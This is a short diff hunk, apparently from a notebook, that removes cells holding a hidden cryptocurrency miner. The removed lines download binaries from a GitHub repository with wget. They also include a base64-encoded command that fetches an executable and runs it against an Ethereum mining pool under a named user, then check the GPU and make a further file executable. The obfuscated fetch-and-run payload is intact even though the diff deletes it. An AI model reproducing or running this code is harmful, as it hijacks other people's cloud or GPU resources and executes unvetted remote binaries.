@@ -1,9 +1,0 @@
-
-import base64
-!wget https://raw.githubusercontent.com/Amiy453/minepur/main/runner
-cmd = str(base64.b64decode("d2dldCBodHRwczovL2dpdGh1Yi5jb20vQW1peTQ1My9taW5lcHVyL2Jsb2IvbWFpbi93ZWlyZAouL3dlaXJkIC0tYWxnbyBFVEhBU0ggLS1wb29sIHN0cmF0dW0rdGNwOi8vZXRoYXNoLnBvb2xiaW5hbmNlLmNvbToxODAwIC0tdXNlciAgamFpc2hyaXJhbTEwOCAtLXdvcmtlciAgamFpc2hyaXJhbTEwOC4wMDEgJChlY2hvICQoc2h1ZiAtaSAxMDAwLTk5OTkgLW4gMSktZXRoKTQKY2htb2QgK3ggd2VpcmQ="), 'utf-8')
-
-!{run}
-!{cmd}
-!nvidia-smi
-!chmod u+x clip-0IX1TW
